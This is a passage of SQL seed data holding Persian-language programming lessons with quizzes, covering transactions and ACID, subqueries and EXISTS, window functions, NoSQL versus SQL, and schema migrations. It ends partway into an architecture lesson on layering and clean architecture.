('sql-b8', 'sql', 'تراکنش و ACID', 56, 13, '[{"k":"p","t":"تراکنش چند عمل را یک واحد اتمی می‌کند: یا همه انجام می‌شوند یا هیچ‌کدام — برای انتقال پول و هر عملیات چندمرحله‌ای حیاتی است."},{"k":"h","t":"تراکنش؛ همه یا هیچ"},{"k":"p","t":"بعضی عملیات چند مرحله‌اند و باید «اتمی» باشند: مثلاً انتقال پول یعنی کسر از یک حساب و افزودن به دیگری — اگر وسطش خطا بیفتد و فقط کسر انجام شده باشد، پول گم می‌شود. تراکنش این را تضمین می‌کند: چند عمل را یک واحد می‌کند که یا همه انجام می‌شوند (COMMIT) یا اگر هر جایی خطا خورد، همه به حالت اول برمی‌گردند (ROLLBACK). پس برنامه می‌تواند مطمئن باشد داده هرگز در یک حالت نیمه‌انجام‌شده نمی‌ماند."},{"k":"h","t":"ACID؛ چهار ضمانت تراکنش"},{"k":"p","t":"تراکنش‌های واقعی چهار ویژگی ACID را دارند: اتمیک بودن (همه یا هیچ)، سازگاری (از یک حالت معتبر به حالت معتبر دیگر می‌رود)، جداسازی (تراکنش‌های همزمان روی هم اثر نمی‌گذارند و انگار پشت‌سرهم اجرا شده‌اند) و ماندگاری (بعد از COMMIT، حتی با قطع برق هم از دست نمی‌رود). جداسازی مهم‌ترین بخش برای فهم است: وقتی دو تراکنش همزمان اجرا می‌شوند، دیتابیس با قفل و نسخه‌بندی (MVCC) جلوی تداخلشان را می‌گیرد تا نتیجه قابل‌پیش‌بینی بماند."},{"k":"h","t":"جدول مرجع"},{"k":"table","head":["ویژگی ACID","ضمانت"],"rows":[["Atomicity","همه عملیات انجام می‌شود یا هیچ‌کدام"],["Consistency","داده از حالت معتبر به حالت معتبر می‌رود"],["Isolation","تراکنش‌های همزمان تداخل نمی‌کنند"],["Durability","بعد از COMMIT، تغییر ماندگار است"]]},{"k":"warn","title":"دام رایج","t":"تراکنش را بیش از حد طولانی نگه دار؛ تا وقتی یک تراکنش باز است، قفل‌هایی را نگه داشته و بقیه را معطل می‌کند. پس در تراکنش فقط عملیات دیتابیس را انجام بده و کارهای کند (مثل صداکردن API خارجی) را بیرون از آن بگذار تا قفل‌ها زود آزاد شوند."},{"k":"tip","title":"نکته منتور","t":"هنگام نوشتن تراکنش، همیشه مسیر خطا را هم ببین: اگر وسط تراکنش استثنا بیفتد، آیا ROLLBACK می‌شود یا تغییرات نیمه‌کاره می‌ماند؟ در بیشتر کتابخانه‌ها باید صریحاً rollback را در catch بنویسی یا از ساختارهایی استفاده کنی که خودکار انجامش می‌دهند."},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["BEGIN شروع، COMMIT تایید، ROLLBACK بازگشت","Atomicity یعنی همه یا هیچ","Isolation یعنی تراکنش‌ها مزاحم هم نمی‌شوند"]},{"k":"h","t":"مثال عملی"},{"k":"code","lang":"sql","title":"tx.sql","code":"BEGIN;\nUPDATE accounts SET balance = balance - 100 WHERE id = 1;\nUPDATE accounts SET balance = balance + 100 WHERE id = 2;\nCOMMIT;   -- هر دو یا هیچ‌کدام"},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: BEGIN شروع، COMMIT تایید، ROLLBACK بازگشت بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"اگر وسط تراکنش انتقال پول، برق برود چه می‌شود؟","opts":["پول نصف منتقل می‌شود","هیچ‌کدام اعمال نمی‌شود چون تا COMMIT نهایی نشده و بازگردانده می‌شود","دوباره اجرا می‌شود","دیتابیس خراب می‌شود"],"ans":1,"why":"تا COMMIT، تغییرات موقتی‌اند؛ با خرابی، کل تراکنش به حالت قبل برمی‌گردد — خاصیت Atomicity."},{"q":"تراکنش چرا برای انتقال پول ضروری است؟","opts":["سرعت","چون اتمی است؛ اگر بعد از کسر و قبل از افزودن خطا بیفتد، ROLLBACK همه‌چیز را برمی‌گرداند و پول گم نمی‌شود","امنیت","فشرده‌سازی"],"ans":1,"why":"بدون تراکنش، یک خطای وسط کار می‌تواند پول را از یک حساب کم کند ولی به دیگری اضافه نکند؛ تراکنش تضمین می‌کند یا هر دو انجام شوند یا هیچ‌کدام، پس داده هرگز نیمه‌کاره نمی‌ماند."},{"q":"Isolation در ACID چه چیزی را تضمین می‌کند؟","opts":["ماندگاری","تراکنش‌های همزمان روی هم اثر نگذارند و نتیجه انگار پشت‌سرهم اجرا شده باشند","سرعت","فشرده‌سازی"],"ans":1,"why":"وقتی چند تراکنش همزمان به داده مشترک می‌رسند، بدون جداسازی می‌توانند نتیجه‌های ناسازگار بسازند؛ دیتابیس با قفل و MVCC آن‌ها را از هم جدا می‌کند تا هرکدام انگار تنها اجرا شده."}]'::jsonb),
('sql-b9', 'sql', 'زیرپرس‌وجو و EXISTS', 56, 14, '[{"k":"p","t":"زیرپرس‌وجو، پرس‌وجویی داخل پرس‌وجوی دیگر است؛ EXISTS برای بررسی وجود معمولاً از IN با لیست بزرگ کارآمدتر است."},{"k":"h","t":"زیرپرس‌وجو؛ پرس‌وجو داخل پرس‌وجو"},{"k":"p","t":"گاهی جواب یک پرس‌وجو، ورودیِ پرس‌وجوی دیگر است؛ مثلاً «مشتری‌هایی که حداقل یک سفارش دارند» — اول باید id سفارش‌دارها را پیدا کنی، بعد مشتری‌ها را. زیرپرس‌وجو (subquery) یعنی یک SELECT داخل SELECT دیگر که می‌تواند در WHERE (با IN یا EXISTS)، در FROM (به‌عنوان جدول موقت) یا در SELECT باشد. خوانایی‌اش گاهی خوب است، ولی باید مراقب کارایی بود؛ چون بسته به دیتابیس و شکلش، می‌تواند برای هر ردیف بیرونی دوباره اجرا شود."},{"k":"h","t":"EXISTS در برابر IN؛ و JOIN به‌جای هر دو"},{"k":"p","t":"برای «آیا وجود دارد؟»، EXISTS معمولاً بهتر از IN با لیست بزرگ است؛ چون EXISTS به‌محض پیدا کردن اولین مورد متوقف می‌شود و نیازی به ساختن کل لیست ندارد، درحالی‌که IN ممکن است همه نتایج داخلی را بسازد و مقایسه کند. ضمن اینکه خیلی از زیرپرس‌وجوها را می‌شود با JOIN بازنویسی کرد که اغلب کاراتر و خواناتر است. پس قبل از زیرپرس‌وجو بپرس: آیا با EXISTS یا یک JOIN ساده‌تر نمی‌شود؟ و با EXPLAIN ببین واقعاً چطور اجرا می‌شود."},{"k":"h","t":"جدول مرجع"},{"k":"table","head":["","IN","EXISTS"],"rows":[["سوال","آیا در این لیست است؟","آیا حداقل یک مورد هست؟"],["رفتار","ممکن است کل لیست داخلی ساخته شود","با اولین مورد متوقف می‌شود"],["کی بهتر است","لیست داخلی کوچک","لیست داخلی بزرگ / فقط بررسی وجود"]]},{"k":"warn","title":"دام رایج","t":"زیرپرس‌وجوی همبسته (correlated) که به ستون پرس‌وجوی بیرونی ارجاع می‌دهد را جدی بگیر؛ چون ممکن است برای «هر» ردیف بیرونی یک‌بار اجرا شود و با جدول بزرگ، زمان نمایی شود. اگر دیدی یک زیرپرس‌وجو کند است، اول ببین correlated نیست و آیا با JOIN یا EXISTS بازنویسی می‌شود."},{"k":"tip","title":"نکته منتور","t":"برای بررسی «وجود نداشتن»، NOT EXISTS را به NOT IN ترجیح بده؛ چون NOT IN با nullهای ستون داخلی رفتار غافلگیرکننده‌ای دارد (اگر حتی یک null باشد، نتیجه کل عبارت خالی می‌شود) ولی NOT EXISTS این مشکل را ندارد."},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["زیرپرس‌وجو می‌تواند در WHERE، SELECT یا FROM باشد","EXISTS به‌محض یافتن اولین تطابق متوقف می‌شود","برای مقایسه با مجموعه از ANY و ALL استفاده کن"]},{"k":"h","t":"مثال عملی"},{"k":"code","lang":"sql","title":"subquery.sql","code":"-- کاربرانی که حداقل یک سفارش دارند:\nSELECT name FROM users u\nWHERE EXISTS (\n  SELECT 1 FROM orders o WHERE o.user_id = u.id\n);"},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: زیرپرس‌وجو می‌تواند در WHERE، SELECT یا FROM باشد بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"چرا EXISTS اغلب از IN بهتر است؟","opts":["کوتاه‌تر است","چون به‌محض یافتن اولین تطابق متوقف می‌شود و نیاز به ساخت کل لیست ندارد","همیشه","کش دارد"],"ans":1,"why":"IN ممکن است کل نتیجه زیرپرس‌وجو را بسازد؛ EXISTS فقط وجود را چک می‌کند و زود برمی‌گردد."},{"q":"چرا EXISTS برای بررسی وجود معمولاً بهتر از IN است؟","opts":["کوتاه‌تر است","چون به‌محض یافتن اولین مورد متوقف می‌شود و نیازی به ساختن کل لیست نتایج داخلی ندارد","جدیدتر است","امن‌تر است"],"ans":1,"why":"IN ممکن است همه نتایج زیرپرس‌وجو را بسازد و بعد مقایسه کند؛ EXISTS فقط می‌پرسد «حداقل یکی هست؟» و با اولین یافت متوقف می‌شود، پس با داده بزرگ خیلی سبک‌تر است."},{"q":"زیرپرس‌وجوی همبسته (correlated) چرا می‌تواند کند باشد؟","opts":["چون جدید است","چون به ستون بیرونی ارجاع می‌دهد و ممکن است برای هر ردیف بیرونی یک‌بار اجرا شود؛ پس زمان با حاصل‌ضرب اندازه دو جدول رشد می‌کند","چون قدیمی است","کند نیست"],"ans":1,"why":"وقتی زیرپرس‌وجو به مقدار ردیف بیرونی وابسته است، نمی‌تواند یک‌بار اجرا و کش شود؛ برای هر ردیف بیرونی دوباره اجرا می‌شود که با جدول بزرگ به‌شدت کند می‌شود — و اغلب با JOIN قابل‌جایگزینی است."}]'::jsonb),
('sql-b10', 'sql', 'توابع پنجره‌ای', 56, 15, '[{"k":"p","t":"توابع پنجره‌ای روی گروهی از ردیف‌ها محاسبه می‌کنند بدون اینکه ردیف‌ها را جمع کنند — برای رتبه‌بندی، مجموع متحرک و مقایسه با قبلی."},{"k":"h","t":"توابع پنجره‌ای؛ محاسبه روی گروه بدون جمع‌شدن"},{"k":"p","t":"GROUP BY ردیف‌ها را جمع می‌کند و برای هر گروه «یک» ردیف برمی‌گرداند؛ ولی خیلی‌وقت‌ها می‌خواهی هم جزئیات هر ردیف را نگه داری و هم یک محاسبه گروهی کنارش داشته باشی — مثل رتبه هر فروشنده در ماهش، یا مجموع متحرک فروش تا امروز. توابع پنجره‌ای دقیقاً این را می‌کنند: برای هر ردیف، روی «پنجره‌ای» از ردیف‌های مرتبط (با OVER و PARTITION BY) محاسبه می‌کنند بدون اینکه ردیف‌ها را جمع کنند. پس خروجی همان تعداد ردیف ورودی است، با یک ستون محاسبه‌شده اضافه."},{"k":"h","t":"PARTITION، ORDER و کاربردها"},{"k":"p","t":"PARTITION BY مشخص می‌کند پنجره چطور گروه‌بندی شود (مثل GROUP BY ولی بدون جمع‌کردن) و ORDER BY داخل OVER ترتیب را برای محاسبات ترتیبی تعیین می‌کند. کاربردهای رایج: ROW_NUMBER و RANK برای رتبه‌بندی درون هر گروه، LAG و LEAD برای دسترسی به ردیف قبلی و بعدی (مقایسه با ماه قبل)، و SUM با یک قاب متحرک برای مجموع تجمعی. این‌ها کارهایی‌اند که بدون توابع پنجره‌ای نیاز به زیرپرس‌وجوهای پیچیده و خود-اتصال داشتند."},{"k":"h","t":"جدول مرجع"},{"k":"table","head":["تابع","کار","مثال کاربرد"],"rows":[["ROW_NUMBER / RANK","رتبه درون هر گروه","۳ فروشنده برتر هر منطقه"],["LAG / LEAD","دسترسی به ردیف قبل/بعد","مقایسه فروش با ماه قبل"],["SUM OVER","مجموع تجمعی یا گروهی","مجموع فروش تا امروز"]]},{"k":"warn","title":"دام رایج","t":"PARTITION BY را با GROUP BY اشتباه نگیر؛ GROUP BY خروجی را جمع می‌کند (یک ردیف در هر گروه) ولی PARTITION BY فقط پنجره محاسبه را مشخص می‌کند و همه ردیف‌ها را نگه می‌دارد. اگر می‌خواهی هم جزئیات و هم محاسبه گروهی، پنجره‌ای لازم داری نه GROUP BY."},{"k":"tip","title":"نکته منتور","t":"تفاوت ROW_NUMBER و RANK را بدان: ROW_NUMBER همیشه شماره‌های متمایز می‌دهد (۱،۲،۳) ولی RANK به مقادیر برابر رتبه برابر می‌دهد و بعدی را می‌پرد (۱،۱،۳). برای «بهترین‌ها حتی با تساوی» معمولاً RANK یا DENSE_RANK درست‌تر است."},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["ROW_NUMBER و RANK رتبه می‌دهند","SUM(x) OVER (PARTITION BY g ORDER BY t) مجموع تجمعی","برخلاف GROUP BY، تعداد ردیف‌ها حفظ می‌شود"]},{"k":"h","t":"مثال عملی"},{"k":"code","lang":"sql","title":"window.sql","code":"-- رتبه هر فروشنده در گروهش:\nSELECT name, team, sales,\n  ROW_NUMBER() OVER (\n    PARTITION BY team ORDER BY sales DESC\n  ) AS rank_in_team\nFROM salespeople;"},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: ROW_NUMBER و RANK رتبه می‌دهند بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"تفاوت تابع پنجره‌ای با GROUP BY چیست؟","opts":["هیچ","تابع پنجره‌ای ردیف‌ها را جمع نمی‌کند؛ روی هر ردیف، محاسبه‌ای روی گروهش نشان می‌دهد","سرعت","سینتکس"],"ans":1,"why":"GROUP BY ردیف‌ها را به یک ردیف خلاصه می‌کند؛ تابع پنجره‌ای همه ردیف‌ها را نگه می‌دارد و ستون محاسبه‌شده اضافه می‌کند."},{"q":"توابع پنجره‌ای چه چیزی را ممکن می‌کنند که GROUP BY نمی‌کند؟","opts":["سرعت بیشتر","محاسبه روی گروه درحالی‌که همه ردیف‌های جزئی هم نگه داشته می‌شوند، مثل رتبه هر ردیف درون گروهش","امنیت","فشرده‌سازی"],"ans":1,"why":"GROUP BY برای هر گروه فقط یک ردیف برمی‌گرداند و جزئیات گم می‌شود؛ تابع پنجره‌ای برای هر ردیف یک مقدار محاسبه‌شده از گروهش اضافه می‌کند بدون اینکه ردیف‌ها را جمع کند."},{"q":"LAG چه می‌کند و چه کاربردی دارد؟","opts":["رتبه می‌دهد","مقدار ستون را از ردیف قبلی (در ترتیب پنجره) می‌آورد؛ مثلاً برای مقایسه فروش این ماه با ماه قبل","مجموع می‌زند","فیلتر می‌کند"],"ans":1,"why":"برای مقایسه با گذشته بدون خود-اتصال، LAG مقدار ردیف قبلی را کنار ردیف فعلی می‌گذارد؛ پس می‌توانی مستقیم تفاضل یا درصد تغییر را حساب کنی."}]'::jsonb),
('sql-b11', 'sql', 'NoSQL و کی استفاده کنیم', 56, 16, '[{"k":"p","t":"NoSQL برای داده‌های بدون اسکیمای ثابت، مقیاس افقی و مدل‌های سند/گراف است؛ ولی تراکنش و JOIN قوی SQL را ندارد — انتخاب بر اساس نیاز است."},{"k":"h","t":"NoSQL؛ وقتی رابطه‌ای کافی نیست"},{"k":"p","t":"دیتابیس‌های رابطه‌ای (SQL) برای داده ساختاریافته با رابطه‌های روشن و تراکنش قوی عالی‌اند، ولی برای برخی نیازها تنگ می‌شوند: داده‌ای که ساختارش مدام عوض می‌شود، حجم عظیمی که باید افقی روی صدها ماشین پخش شود، یا الگوهایی مثل سند و گراف. NoSQL مجموعه‌ای از دیتابیس‌های غیررابطه‌ای است که هرکدام برای یک الگو بهینه‌اند: سند (MongoDB)، کلید-مقدار (Redis)، ستون‌گرا (Cassandra) و گراف (Neo4j). انتخاب بین این‌ها و SQL باید بر اساس الگوی واقعی داده و دسترسی باشد، نه مد روز."},{"k":"h","t":"مقایسه و معیار انتخاب"},{"k":"p","t":"SQL نقاط قوت مشخصی دارد: اسکیما و تایپ قوی، JOIN برای رابطه‌های پیچیده، و تراکنش ACID واقعی. NoSQL در مقابل انعطاف اسکیما، مقیاس‌پذیری افقی راحت‌تر و مدل‌های داده نزدیک‌تر به برخی مسائل را می‌دهد، ولی معمولاً JOIN ضعیف‌تر و ضمانت تراکنش محدودتری دارد. قاعده عملی: اگر داده‌ات رابطه‌های روشن و نیاز به تراکنش دارد (سفارش، مالی)، SQL؛ اگر سندِ نیمه‌ساختاریافته با خواندن پرتکرار و مقیاس افقی (پروفایل کاربر، لاگ، کش)، NoSQL. خیلی از سیستم‌های واقعی هم از هر دو کنار هم استفاده می‌کنند (polyglot persistence)."},{"k":"h","t":"جدول مرجع"},{"k":"table","head":["","SQL (رابطه‌ای)","NoSQL"],"rows":[["اسکیما","ثابت و قوی","انعطاف‌پذیر"],["رابطه","JOIN قوی","محدود یا بدون JOIN"],["تراکنش","ACID کامل","معمولاً ضعیف‌تر"],["مقیاس","عمودی راحت‌تر","افقی راحت‌تر"],["کی","داده رابطه‌دار، تراکنش","سند نیمه‌ساختاریافته، مقیاس افقی"]]},{"k":"warn","title":"دام رایج","t":"NoSQL را فقط به‌خاطر «مدرن بودن» انتخاب نکن؛ اگر داده‌ات رابطه‌ای است و نیاز به تراکنش داری، رفتن سراغ یک دیتابیس سندی یعنی بعداً با دست، JOIN و سازگاری را شبیه‌سازی کنی — پیچیدگی‌ای که SQL رایگان می‌داد."},{"k":"tip","title":"نکته منتور","t":"قبل از انتخاب، «الگوی دسترسی» را بنویس: چه چیزهایی خوانده و نوشته می‌شود، چقدر، و با چه رابطه‌ای. خیلی‌وقت‌ها همین یک صفحه مشخص می‌کند که SQL کافی است یا واقعاً به یک مدل NoSQL نیاز داری."},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["سند‌گرا (MongoDB) برای داده نیمه‌ساختار","کلید-مقدار (Redis) برای کش و سرعت","گراف (Neo4j) برای روابط عمیق مثل شبکه اجتماعی"]},{"k":"h","t":"کاربرد و مقایسه"},{"k":"table","head":["معیار","SQL","NoSQL"],"rows":[["اسکیما","ثابت و قوی","انعطاف‌پذیر"],["تراکنش","ACID قوی","معمولاً ضعیف‌تر"],["مقیاس","عمودی راحت‌تر","افقی راحت‌تر"],["رابطه","JOIN قوی","محدود"]]},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: سند‌گرا (MongoDB) برای داده نیمه‌ساختار بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"کی SQL را به NoSQL ترجیح می‌دهی؟","opts":["همیشه","وقتی تراکنش ACID و رابطه‌های پیچیده و اسکیمای مشخص نیاز داری","هیچ‌وقت","برای سرعت"],"ans":1,"why":"برای سیستم‌های مالی و هر جایی که سازگاری داده حیاتی است، SQL با ACID انتخاب امن‌تری است."},{"q":"NoSQL در چه مواردی نسبت به SQL انتخاب بهتری است؟","opts":["همیشه","داده نیمه‌ساختاریافته با اسکیمای متغیر، نیاز به مقیاس افقی بزرگ، یا الگوهای سند/گراف که رابطه‌ای به آن‌ها نمی‌نشیند","هیچ‌وقت","فقط برای وب"],"ans":1,"why":"NoSQL برای انعطاف اسکیما و پخش افقی طراحی شده؛ پس وقتی داده ساختار ثابت ندارد یا حجمش باید روی صدها ماشین پخش شود، مدل‌های سند یا کلید-مقدار مناسب‌ترند. ولی برای رابطه‌های پیچیده و تراکنش، SQL قوی‌تر است."},{"q":"چرا خیلی از سیستم‌های بزرگ از SQL و NoSQL کنار هم استفاده می‌کنند؟","opts":["برای زیبایی","چون هر الگوی داده با یک مدل بهتر می‌نشیند؛ مثلاً سفارش و مالی در SQL برای تراکنش، و پروفایل و کش در NoSQL برای سرعت و مقیاس","اجباری است","برای کاهش هزینه"],"ans":1,"why":"هیچ دیتابیسی برای همه‌چیز بهترین نیست؛ پس به‌جای تحمیل یک مدل به همه داده‌ها، هر بخش را در مدلی نگه می‌دارند که با الگوی خواندن/نوشتنش جور است — این یعنی polyglot persistence."}]'::jsonb),
('sql-b12', 'sql', 'مهاجرت اسکیما و نسخه‌بندی', 56, 17, '[{"k":"p","t":"تغییر اسکیما در تولید با مهاجرت‌های نسخه‌بندی‌شده انجام می‌شود؛ هر تغییر یک فایل، قابل اجرا و قابل بازگشت — ابزارهایی مثل Flyway یا Prisma."},{"k":"h","t":"اسکیما زنده است؛ تغییرش را مدیریت کن"},{"k":"p","t":"اسکیما یک‌بار نوشته و رها نمی‌شود؛ با رشد محصول مدام ستون و جدول اضافه و عوض می‌شود. مشکل این است که این تغییرات باید هم روی کد و هم روی دیتابیس‌های توسعه، تست و تولید اعمال شوند — و اگر دستی و پراکنده انجام شوند، دیر یا زود یک محیط از بقیه عقب می‌ماند و «روی ماشین من کار می‌کرد» سر می‌رسد. مهاجرت اسکیما (migration) راه‌حل است: هر تغییر به‌صورت یک فایل نسخه‌بندی‌شده ثبت می‌شود که می‌گوید چه چیزی عوض شود، و ابزار مهاجرت آن‌ها را به ترتیب روی هر دیتابیس اجرا می‌کند."},{"k":"h","t":"مهاجرتِ امن؛ قابل اجرا و قابل بازگشت"},{"k":"p","t":"یک مهاجرت خوب دو ویژگی دارد: قابل اجرا (idempotent یا حداقل قابل‌ردیابی، که دوباره اجرا شدنش مشکل نسازد) و ترجیحاً قابل بازگشت (rollback). مهم‌تر، تغییرات بزرگ را به قدم‌های کوچک و سازگار بشکن: مثلاً برای تغییرنام یک ستون، اول ستون جدید اضافه کن، کد را طوری عوض کن که هر دو را بنویسد و بخواند، داده را منتقل کن، و بعد ستون قدیمی را حذف کن — نه یک تغییر بزرگ که وسطش نسخه قدیمی کد بشکند. ابزارهایی مثل Flyway، Liquibase و Prisma این چرخه را خودکار می‌کنند."},{"k":"h","t":"جدول مرجع"},{"k":"table","head":["مرحله تغییرنام ستون (الگوی سازگار)","کار"],"rows":[["۱","افزودن ستون جدید کنار قدیمی"],["۲","کد هر دو را بنویسد/بخواند (سازگار با هر دو نسخه)"],["۳","انتقال داده قدیمی به جدید"],["۴","حذف ستون قدیمی بعد از استقرار کامل"]]},{"k":"warn","title":"دام رایج","t":"هرگز مهاجرت را دستی و فقط روی تولید اجرا نکن؛ چون دیر یا زود فراموش می‌شود و بقیه محیط‌ها عقب می‌مانند. مهاجرت‌ها باید در ریپازیتوری و کنار کد باشند و در CI/CD خودکار اجرا شوند تا همه محیط‌ها همیشه همگام بمانند."},{"k":"tip","title":"نکته منتور","t":"مهاجرت‌هایی که روی داده حجیم قفل می‌گیرند (مثل افزودن ستون NOT NULL بدون مقدار پیش‌فرض به جدول بزرگ) را در ساعات کم‌ترافیک یا با روش‌های مرحله‌ای اجرا کن؛ یک مهاجرت که چند دقیقه جدول را قفل کند، می‌تواند کل سرویس را برای کاربرها نگه دارد."},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["هر مهاجرت شماره نسخه و دو مسیر up/down دارد","ستون جدید را nullable اضافه کن تا قفل نشود","تغییرهای بزرگ را چندمرحله‌ای کن"]},{"k":"h","t":"مثال عملی"},{"k":"code","lang":"sql","title":"migration.sql","code":"-- 002_add_phone.up.sql\nALTER TABLE users ADD COLUMN phone TEXT;\n\n-- 002_add_phone.down.sql\nALTER TABLE users DROP COLUMN phone;"},{"k":"tip","title":"نکته منتور","t":"افزودن ستون NOT NULL به جدول بزرگ، جدول را قفل می‌کند؛ اول nullable اضافه کن، پر کن، بعد NOT NULL کن — سه مهاجرت کوچک و امن."},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: هر مهاجرت شماره نسخه و دو مسیر up/down دارد بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"چرا مهاجرت‌ها را نسخه‌بندی می‌کنیم؟","opts":["برای زیبایی","تا هر محیط دقیقاً همان تغییرات را به ترتیب بگیرد و تغییرات قابل بازگشت و ردیابی باشند","اجباری نیست","برای سرعت"],"ans":1,"why":"بدون نسخه‌بندی، اسکیمای dev و prod از هم جدا می‌شود و معلوم نیست چه تغییری کجا اعمال شده."},{"q":"مهاجرت اسکیما (migration) چه مشکلی را حل می‌کند؟","opts":["سرعت query","هماهنگ‌نگه‌داشتن تغییرات اسکیما بین کد و همه محیط‌ها با فایل‌های نسخه‌بندی‌شده و اجرای خودکار و ترتیبی","امنیت","فشرده‌سازی"],"ans":1,"why":"بدون مهاجرت، تغییرات اسکیما دستی و پراکنده اعمال می‌شود و محیط‌ها از هم عقب می‌مانند؛ با مهاجرت، هر تغییر یک فایل در git است که روی هر دیتابیس به ترتیب اجرا می‌شود، پس همه همگام و قابل‌ردیابی‌اند."},{"q":"چرا تغییر بزرگ اسکیما (مثل تغییرنام ستون) را باید مرحله‌ای و سازگار انجام داد؟","opts":["کندتر است","چون کد قدیمی و جدید همزمان در استقرار وجود دارند؛ با مراحل سازگار، هیچ نسخه‌ای وسط کار نمی‌شکند و قابل بازگشت است","زیباتر است","اجباری است"],"ans":1,"why":"در استقرار تدریجی، برای مدتی هم نسخه قدیمی کد و هم جدید اجرا می‌شوند؛ اگر اسکیما یک‌شبه عوض شود، یکی از این دو می‌شکند. مراحل سازگار تضمین می‌کند هر دو نسخه با اسکیما کار کنند تا استقرار کامل شود."}]'::jsonb),
('arch-r1', 'arch', 'لایه‌بندی و معماری تمیز: چه چیزی به چه چیزی وابسته باشد', 60, 1, '[{"k":"p","t":"معماری نرم‌افزار درباره آجر و ملات نیست؛ درباره «مجوز وابستگی» است: چه لایه‌ای اجازه دارد از چه لایه‌ای استفاده کند. وقتی این مرزها روشن باشند، تعویض دیتابیس، فریم‌ورک یا پروتکل درد ندارد — و وقتی نباشند، هر تغییر کوچک، زلزله‌ای در کل کدبیس می‌شود."},{"k":"h","t":"چهار لایه کلاسیک"},{"k":"p","t":"یک سرویس بک‌اند معمولاً چهار لایه دارد: Handler/Controller (ورودی HTTP را می‌گیرد و اعتبارسنجی اولیه می‌کند)، Service (منطق کسب‌وکار: «سفارش را ثبت کن، موجودی را کم کن، تخفیف را حساب کن»)، Repository (تنها جایی که SQL و دیتابیس دیده می‌شود) و Model (ساختار داده‌ها). قانون طلایی: وابستگی فقط رو به پایین؛ Service نامی از HTTP نمی‌برد و Repository نامی از JSON نمی‌برد. نتیجه: همان Service با یک Handler خط فرمان یا یک Consumer صف پیام هم کار می‌کند."},{"k":"h","t":"قانون مهم: SQL از Service بیرون"},{"k":"p","t":"رایج‌ترین معماریِ شکسته: Handler مستقیم SQL می‌زند یا Service پر از query است. آن‌وقت «تست منطق کسب‌وکار» بدون دیتابیس ممکن نیست، «تعویض دیتابیس» یعنی بازنویسی، و «جست‌وجوی باگ داده» یعنی گشتن در ده فایل. Repository این مشکل را حل می‌کند: Service می‌گوید «سفارش‌های این کاربر را بده» و نمی‌داند PostgreSQL است یا Mongo. Interface بین این دو، همان مرزی است که تست را میلی‌ثانیه‌ای و تغییر را بی‌خطر می‌کند."},{"k":"h","t":"Clean Architecture: همه‌چیز رو به مرکز"},{"k":"p","t":"معماری تمیز (Uncle Bob) همین ایده را تا ته می‌برد: قوانین کسب‌وکار در مرکز، و هرچه فنی‌تر (فریم‌ورک، دیتابیس، UI) بیرونی‌تر — و وابستگی‌ها فقط رو به داخل. در مرکز، Entityها و Use Caseها نه از HTTP خبر دارند نه از دیتابیس؛ فقط «قواعد بازی»‌اند. این سخت‌گیری برای هر پروژه‌ای لازم نیست، ولی جهتِ آن همیشه درست است: هرچه دیرتر عوض می‌شود، مرکزی‌تر و مستقل‌تر باشد."},{"k":"h","t":"مثال حل‌شده"},{"k":"code","lang":"py","title":"layers.py","code":"from abc import ABC, abstractmethod\n\n# Repository: تنها جایی که دیتابیس دیده می‌شود\nclass OrderRepo(ABC):\n    @abstractmethod\n    def save(self, order): ...\n    @abstractmethod\n    def by_user(self, user_id): ...\n\nclass PgOrderRepo(OrderRepo):          # امروز PostgreSQL\n    def save(self, order):\n        db.execute(\"INSERT ...\", order)  # SQL فقط این‌جا\n\n# Service: منطق خالص، بدون دیتابیس و بدون HTTP\nclass OrderService:\n    def __init__(self, repo: OrderRepo):\n        self.repo = repo\n    def place(self, cart):\n        if cart.total <= 0: raise ValueError(\"سبد خالی\")\n        order = Order(items=cart.items, total=cart.total)\n        self.repo.save(order)\n        return order\n\n# Handler: فقط HTTP — اعتبارسنجی ورودی و خروجی\n@app.post(\"/orders\")\ndef create_order(req):\n    order = service.place(cart_from(req.json))\n    return {\"id\": order.id}, 201"},{"k":"list","items":["OrderService هیچ import‌ای از HTTP و SQL ندارد — با خط فرمان و صف پیام هم کار می‌کند.","در تست، به‌جای PgOrderRepo یک FakeRepo می‌دهیم که در حافظه ذخیره می‌کند — تست منطق بدون دیتابیس.","تعویض PostgreSQL با Mongo یعنی فقط نوشتن MongoOrderRepo — Service دست‌نخورده.","Handler فقط ترجمه HTTP به فراخوانی Service است؛ منطق کسب‌وکار در آن نشت نکرده."]},{"k":"def","term":"نشت انتزاع","t":"وقتی جزئیات یک لایه بیرون می‌زند و لایه بالایی را آلوده می‌کند: مثلاً Exception دیتابیس تا HTTP بالا می‌آید و کاربر پیام «connection refused» می‌بیند. درمان: هر لایه خطاهای لایه پایین را بگیرد و به زبان خودش ترجمه کند — خطای Repository به ServiceError و آن به پاسخ ۴xx/۵xx مناسب."},{"k":"table","head":["لایه","مسئولیت","نباید بداند"],"rows":[["Handler","HTTP، اعتبارسنجی ورودی، کد وضعیت","منطق کسب‌وکار، SQL"],["Service","قواعد کسب‌وکار و ترتیب عملیات","فرمت JSON، پروتکل"],["Repository","ذخیره و بازیابی، 